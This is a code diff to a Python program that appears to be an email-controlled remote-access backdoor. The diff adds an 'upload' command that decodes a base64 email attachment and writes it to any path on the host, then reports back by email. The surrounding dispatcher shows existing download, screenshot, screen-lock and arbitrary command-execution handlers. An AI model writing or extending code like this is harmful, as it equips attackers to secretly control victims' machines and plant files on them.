@@ -16,6 +16,7 @@ import json
 #import logging
 
 #from traceback import print_exc, format_exc
+from base64 import b64decode
 from smtplib import SMTP
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
@@ -377,6 +378,25 @@ class download(threading.Thread):
         except Exception as e:
             sendEmail({'cmd': 'download', 'res': 'Failed: {}'.format(e)}, self.jobid)
 
+class upload(threading.Thread):
+
+    def __init__(self, jobid, dest, attachment):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.dest = dest
+        self.attachment = attachment
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            with open(self.dest, 'wb') as fileh:
+                fileh.write(b64decode(self.attachment))
+            sendEmail({'cmd': 'upload', 'res': 'Success'}, self.jobid)
+        except Exception as e:
+            sendEmail({'cmd': 'upload', 'res': 'Failed: {}'.format(e)}, self.jobid)
+
 class lockScreen(threading.Thread):
 
     def __init__(self, jobid):
@@ -560,9 +580,12 @@ def checkJobs():
                     elif cmd == 'download':
                         download(jobid, arg)
 
+                    elif cmd == 'upload':
+                        upload(jobid, arg, msg.attachment)
+
                     elif cmd == 'screenshot':
                         screenshot(jobid)
-                    
+
                     elif cmd == 'cmd':
                         execCmd(arg, jobid)
 
